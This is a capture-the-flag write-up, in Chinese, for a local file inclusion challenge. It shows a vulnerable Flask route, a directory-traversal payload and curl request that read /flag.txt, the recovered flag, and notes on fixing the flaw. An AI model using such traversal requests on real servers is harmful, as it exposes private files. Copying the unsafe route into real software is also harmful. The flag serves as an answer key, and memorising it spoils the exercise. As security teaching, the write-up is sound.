# Greycademy2025 Local File Inclusion

## 题目简述

网站通过 `/file?path=...` 展示 `/app/photos` 下的图片，但服务器直接把用户参数拼进绝对路径。题面说明 flag 位于容器根目录 `/flag.txt`，目标是利用目录穿越读取它。

## 解题过程

核心代码没有做规范化后的根目录约束：

```python
@app.route("/file")
def file():
    return send_file(f"/app/photos/{request.args.get('path')}")
```

从 `/app/photos` 到文件系统根目录需要依次越过 `photos`、`app`，多写一级 `..` 仍会停留在根目录，因此可请求：

```text
/file?path=../../../flag.txt
```

等价的命令行请求：

```bash
curl --path-as-is \
  'http://target/file?path=../../../flag.txt'
```

Flask 将拼接路径交给底层文件打开逻辑，规范化后指向 `/flag.txt`。Dockerfile 也确认部署时执行了：

```dockerfile
RUN mv flag.txt /flag.txt
```

响应内容为：

```text
grey{pretend_these_are_the_epstein_files}
```

## 方法总结

目录穿越的关键是确定基准目录和目标绝对位置，再计算 `..` 层级。仅检查扩展名或字符串中是否含 `..` 都容易被绕过；正确修复方式是解析规范化路径后验证其仍位于允许的根目录，或只接受服务器预先登记的文件标识符。
